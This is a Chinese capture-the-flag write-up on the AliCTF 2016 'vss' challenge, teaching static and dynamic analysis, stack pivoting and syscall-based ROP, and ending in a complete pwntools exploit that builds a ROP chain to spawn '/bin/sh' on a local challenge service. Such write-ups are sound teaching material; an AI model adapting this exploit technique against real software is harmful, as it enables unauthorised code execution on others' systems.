
# [原创][分享]Pwn从入门到放弃（二）

## 0x01 栈溢出利用

## 0x02 基本的ROP利用

## 0x03 题目二：

该题目是AliCTF 2016中一道题，vss

### 第一步：

`checksec`看一下该程序开了哪些保护：

![图片描述](upload/attach/201912/510716\_MSHR3NPARCV32U4.png)

同样也是64位小端，只开启了`RELRO`和`NX`两项保护。

### 第二步：

运行该程序看看：

![图片描述](upload/attach/201912/510716\_CDPAU49XQUN96PY.png)

让输入一段`password`，随便输入了几个字母，没有任何正确和错误的提示

### 第三步：

用`gdb`调试看看：

![图片描述](upload/attach/201912/510716\_EPMA4SJ6N6BPGUA.png)

发现崩溃在了`0x401124`处，`movzx eax,BYTE PTR [rbp+rax*1-0x40]`，但似乎无法计算溢出位置。

### 第四步：

将该程序丢到`IDA`看一下：

![图片描述](upload/attach/201912/510716\_WHE9J6X2PQUT53P.png)

发现函数无法识别，应该是使用了`strip`将符号信息做了剔除。程序定位在了`start`处。

> 知识点1：`strip`，简单的说就是给文件脱掉外衣，具体就是从特定文件中剥掉一些符号信息和调试信息，使文件变小。

### 第五步：

寻找`main`函数入口，这里有两种方法，一种是通过经验判断，在`start`末尾处的`call`，应该是`libc_start_main`函数，而其上方处`offset sub_4011B1`应该就是`main`函数了。另一种是，直接`shift+F12`通过字符串查找“`password`”，找到`main`函数。

![图片描述](upload/attach/202002/510716\_TKE4NG65YF3WNVR.png)

### 第六步:

进入`main`函数后，`F5`查看伪代码：

![图片描述](upload/attach/202002/510716\_BVEW5K8U6JYXPE5.png)

其中`sub_473EA0`应为`read`函数，猜测应该是用于读取`password`的输入。

在进入`sub_40108E`函数时，发现了对于读取输入值后的逻辑判断：

![图片描述](upload/attach/202002/510716\_C9KJYVKQGR86GYA.png)

如果是以“py”开头，则直接返回，后面的循环判断看的懵，没办法，C/C++功底太差，@_@

![图片描述](upload/attach/202002/510716\_7QZN7ATNG6F94NV.png)

另外，在`40108E`函数中看到疑似`strncpy`的函数。

> 知识点2：`strncpy`函数是将输入内容的指定长度字符串复制给一个字符串数组中，代码举例：

```c
#include<stdio.h>
#include<string.h>
int main(){
char name [] = {"Chinanet"},destin[20]={};
strncpy(destin,name,3);
printf("%s\n",destin);
}
```

打印输出的结果为"Chi"。

### 第七步：

动态调试看看吧，因为我使用的是`linux`的虚拟机，因此需要使用`IDA`来远程动态调试。

![图片描述](upload/attach/202002/510716\_89TW7DU3KBJBHBN.png)

在`sub437EA0`和`sub40108E`处下个断，输入70个"A"和10个"1"，然后动态跟一下栈状态：

输入70个"A"和10个"1"时的，栈帧状态：

![](upload/attach/202002/510716\_9MQSN37DJBCCCGE.png)

当进入`sub40108E`后，完成`strncpy`后的栈帧状态：

![](upload/attach/202002/510716\_5AHFNBEANZ43YKG.png)

发现`RBP`和返回地址已被覆盖，因此可以得知73~80个字符可以覆盖返回地址，在完成`strcpy`后，会将所输入的内容逐个字符与`66h`进行异或，然后最终报错：

![](upload/attach/202002/510716\_RNJ8RRU2M5H4UF6.png)

`RBP+RAX`的值刚好位于了只读的区域：

![](upload/attach/202002/510716\_FQHNDNJVGRTBVTH.png)

### 第八步：

由于可控可执行的栈空间73~80（8个字节），因此需要利用`stack pivot`技术将栈顶上移到`main`栈帧空间中利用（因为`main`函数申请了`400h`的空间），然后再构造`ropchain`：

![图片描述](upload/attach/202002/510716\_FZFAVSSY4RYBRJR.png)

### 第九步：

程序由于没有引入`libc.so`，因此只能考虑使用程序中的`syscall`，利用`syscall`来调用所需的函数。

![图片描述](upload/attach/202002/510716\_VQEDS5PYGJRNNPG.png)

> 知识点3：关于`syscall`的调用方法，可以参看<a href="elink@3b4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3N6r3y4U0N6s2N6Q4x3V1k6H3i4K6u0r3x3e0p5@1y4e0l9@1y4o6W2Q4x3X3g2Z5N6r3#2D9">syscall调用表</a>

### 第十步：

栈溢出布局思路（自带画图工具凑合画的）：

![图片描述](upload/attach/202001/510716\_9SCN2GCSDJP5HY5.png)

另外，由于需要使用`syscall`来调用所需函数，因此需要为`syscall`调用时的参数进行布局，上篇文章已经提过了，关于64位寄存器，依次是`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`，而`read`和`sys_execve`都是需要三个参数的，所以我们要找到类似`pop rdi`、`pop rsi`、`pop rdx`的命令来控制三个参数。

### 第十一步：

有两种方法，一种利用`ROPgadget`直接找到并生成可利用的`ROPchain`，另一种方法是通过`ROPgadget`找到一处`add rsp` `xxx`（大于`0x50`），然后布置`ROP`链。两种`EXP`代码如下：

```bash
python ROPgadget.py --binary ~/Desktop/vss/vss --ropchain
```

代码一：

```python
from pwn import *
from struct import pack
p = remote('127.0.0.1',4000)
recv_content = p.recvuntil('Password:\n')
p2 = ''
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
p2 += pack('<Q', 0x00000000006c4080) # @ .data
p2 += pack('<Q', 0x000000000046f208) # pop2 rax ; ret
p2 += '/bin//sh'
p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p2 += pack('<Q', 0x0000000000401823) # pop2 rdi ; ret
p2 += pack('<Q', 0x00000000006c4080) # @ .data
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
p2 += pack('<Q', 0x000000000043ae05) # pop2 rdx ; ret
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000045f2a5) # syscall ; ret
payload1 = 'py' + 'A' * (0x4e - 0x8) + p64(0x000000000044892a) + 'A' * (0xd0 - 0x50) + p2
p.sendline(payload1)
p.interactive()
```

代码二：
